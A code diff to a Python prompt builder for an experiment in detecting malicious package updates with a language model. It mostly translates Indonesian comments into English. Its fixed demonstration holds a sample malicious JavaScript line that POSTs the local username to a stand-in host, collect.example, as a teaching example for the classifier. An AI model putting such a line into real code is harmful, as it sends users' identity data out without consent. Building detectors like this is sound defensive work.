@@ -1,8 +1,11 @@
-"""Prompt builder per konfigurasi eksperimen (E0-E4).
+"""Prompt builders, one per experiment configuration.
 
-Perbedaan antar konfigurasi HANYA pada contoh yang disertakan — smart-diff,
-intent, dan decision rule identik di semua konfigurasi. Kalau tidak begitu,
-selisih F1 antar konfigurasi tidak bisa diklaim berasal dari retrieval.
+Configurations differ ONLY in the examples they carry — the smart-diff, the
+intent profile and the decision rule are identical everywhere. Otherwise a
+difference between configurations could not be attributed to retrieval.
+
+Still on the superseded E0-E4 scheme; docs/experiments.md §4 lists the migration
+to E0-noint, E0, E2, E3, E3-k2, E4, E4-noint.
 """
 
 CONFIGS = ["E0", "E1", "E2", "E3", "E4"]
@@ -17,8 +20,8 @@ lisensi, scraper, deprecation — sering memakai API yang sama dengan payload ja
 Jawab HANYA dengan JSON:
 {"verdict": "malicious" | "benign", "evidence": ["baris atau konstruksi yang jadi dasar"], "reason": "satu kalimat"}"""
 
-# E1 memakai demonstrasi tetap yang sama untuk SEMUA update: itu yang memisahkan
-# "efek punya contoh" dari "efek contoh yang relevan" (E2+).
+# E1 shows the same fixed demonstration for EVERY update, which separates "the
+# effect of having an example" from "the effect of a relevant example" (E2+).
 FIXED_DEMO = {
     "intent": "Utility untuk memformat tanggal",
     "diff": "+const os = require('os');\n+fetch('http://collect.example/i', {method:'POST', body: os.userInfo().username});",
@@ -27,6 +30,7 @@ FIXED_DEMO = {
 }
 
 
+# _pair_block renders the update under review as prompt text.
 def _pair_block(pair):
     lines = [f"Paket: {pair.get('name', pair['id'])}"]
     if pair.get("before") or pair.get("after"):
@@ -38,6 +42,7 @@ def _pair_block(pair):
     return "\n".join(lines)
 
 
+# _card_block renders one retrieved knowledge-base card as prompt text.
 def _card_block(card):
     head = f"[Contoh {card['label'].upper()}] {card.get('name', card['id'])}"
     body = [f"Intent: {card.get('intent', '-')}"]
@@ -47,6 +52,7 @@ def _card_block(card):
     return head + "\n" + "\n".join(body)
 
 
+# _demo_block renders the fixed demonstration used by E1.
 def _demo_block():
     d = FIXED_DEMO
     return (
@@ -55,10 +61,10 @@ def _demo_block():
     )
 
 
+# build assembles the chat messages for one configuration.
 def build(config, pair, cards=()):
-    """Rakit messages untuk satu konfigurasi. `cards` sudah dipilih pemanggil."""
     if config not in CONFIGS:
-        raise ValueError(f"konfigurasi tidak dikenal: {config}")
+        raise ValueError(f"unknown configuration: {config}")
 
     parts = []
     if config == "E1":
